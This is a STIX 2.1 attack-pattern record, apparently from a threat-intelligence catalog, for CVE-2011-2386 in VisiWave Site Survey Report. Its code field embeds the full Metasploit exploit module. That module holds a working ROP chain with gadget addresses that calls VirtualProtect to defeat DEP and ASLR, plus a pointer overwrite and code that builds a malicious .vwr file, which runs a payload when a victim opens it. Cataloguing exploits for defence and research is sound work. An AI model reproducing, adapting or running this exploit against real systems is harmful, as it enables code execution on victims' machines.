{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4eb96f9-996d-4b25-8b04-639d1b4e8526",
    "created": "2024-08-14T16:37:42.483317Z",
    "modified": "2024-08-14T16:37:42.483321Z",
    "name": "VisiWave VWR File Parsing Vulnerability",
    "description": " This module exploits a vulnerability found in VisiWave's Site Survey Report application. When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type' property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text' 'Image'), but if a match isn't found, the function that's supposed to handle this routine ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10] instruction.  This allows attackers to overwrite it with any arbitrary value, and results code execution.  A patch is available at visiwave.com; the fix is done by XORing the return value as null if no match is found, and then it is validated before use.  NOTE: During installation, the application will register two file handles, VWS and VWR, which allows a victim user to 'double click' the malicious VWR file and execute code.  This module was also built to bypass ASLR and DEP.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/visiwave_vwr_type.rb",
            "external_id": "visiwave_vwr_type.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2386"
        },
        {
            "source_name": "reference",
            "url": "http://www.visiwave.com/blog/index.php?/archives/4-Version-2.1.9-Released.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.stratsec.net/Research/Advisories/VisiWave-Site-Survey-Report-Trusted-Pointer-%28SS-20"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VisiWave VWR File Parsing Vulnerability',\n      'Description'    => %q{\n        This module exploits a vulnerability found in VisiWave's Site Survey Report application.\n        When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type'\n        property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text',\n        'Image'), but if a match isn't found, the function that's supposed to handle this routine\n        ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10]\n        instruction.  This allows attackers to overwrite it with any arbitrary value, and results code\n        execution.  A patch is available at visiwave.com; the fix is done by XORing the return value as\n        null if no match is found, and then it is validated before use.\n\n        NOTE: During installation, the application will register two file handles, VWS and VWR, which allows a\n        victim user to 'double click' the malicious VWR file and execute code.  This module was also built\n        to bypass ASLR and DEP.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>',  # original discovery & msf exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>'  # msf exploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2386' ],\n          [ 'OSVDB', '72464'],\n          [ 'URL', 'http://www.visiwave.com/blog/index.php?/archives/4-Version-2.1.9-Released.html' ],\n          [ 'URL', 'http://www.stratsec.net/Research/Advisories/VisiWave-Site-Survey-Report-Trusted-Pointer-%28SS-20'],\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'BadChars'    => \"\\x00\\x0a\\x0d\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3/Windows 7 SP0',\n            {\n              'Offset' => 3981,         # offset to rop gadgets\n              'Pointer' => 0x007AF938,  # POP R32; POP R32; POP R32; ADD ESP 50; RETN (\"magic\" pointer)\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-20',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.vwr']),\n      ])\n  end\n\n  def exploit\n\n    # Allowing nulls in our rop chain is like giving gold to midas.\n    # instructions taken from the applications non aslr modules\n    # libcurl.dll, VisiWaveReport.exe and blah blah\n    rop_gadgets =\n    [\n      0x1001AFBD,  # INC EBP; PUSH ESP; POP EDI; POP ESI; POP EBP; POP EBX; RET\n      0xc0fff333,  # junk\n      0xc0fff333,  # junk\n      0x000004cf,  # lwSize 1231 bytes\n      0x100017DD,  # POP ECX; RETN\n      0x10037a60,  # Writeable address from .data of libcurl.dll\n      0x10011104,  # POP EDX; RETN\n      0x00000040,  # RWX for VirtualProtect()\n      0x10026E4D,  # MOV EAX,EDI # POP EDI # RETN\n      0x10002ac6,  # RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x10022641,  # ADD EAX, 20; RETN\n      0x004048B1,  # XCHG EAX,EBP\n      0x1001BD3F,  # POP EAX; RETN\n      0x10032048,  # IAT Address - constant pointer to VirtualProtect()\n      0x1000FA4A,  # MOV EAX,DWORD PTR DS:[EAX]; RETN\n      0x00657fd7,  # XCHG EAX,ESI; RETN\n      0x1000af40,  # PUSHAD; RET\n    ].pack(\"V*\")\n\n    # grab the pointer to our buffer\n    pointer = [target[\"Pointer\"]].pack(\"V\")\n\n    sploit = pointer  # begin life in EDX\n    sploit << rand_text_alphanumeric(target[\"Offset\"])  # massive offset\n    sploit << rop_gadgets      # rop chain\n    sploit << make_nops(300)   # safe landing\n    sploit << payload.encoded  # profit!\n\n    vwr_data = \"FileType: SSREPORT\\r\\n\"\n    vwr_data << \"Product: VisiWave Site Survey, 1.6.5 Beta\\r\\n\"\n    vwr_data << \"FileVersion: 10\\r\\n\"\n    vwr_data << \"Item: Global Properties\\r\\n\"\n    vwr_data << \"Checked: 1\\r\\n\"\n    vwr_data << \"Type: #{sploit}\\r\\n\"\n    vwr_data << \"SurveyFile: C:\\\\Program Files\\\\VisiWave Site Survey\\\\Samples\\\\SampleData.vws\\r\\n\"\n    vwr_data << \"FloorPlanImageReport: C:\\\\WINDOWS\\\\Web\\\\bullet.gif\\r\\n\"\n    vwr_data << \"DefaultOrientation: 0\\r\\n\"\n    vwr_data << \"Header:\\r\\n\"\n    vwr_data << \"Footer:\\r\\n\"\n    vwr_data << \"LeftMargin: 100\\r\\n\"\n    vwr_data << \"RightMargin: 100\\r\\n\"\n    vwr_data << \"TopMargin: 50\\r\\n\"\n    vwr_data << \"BottomMargin: 50\\r\\n\"\n    vwr_data << \"Item: #{rand_text_alpha(3)}\\r\\n\"\n    vwr_data << \"Checked: 1\\r\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}'...\")\n    file_create(vwr_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-20",
    "x_mitre_platforms": [
        "win'"
    ]
}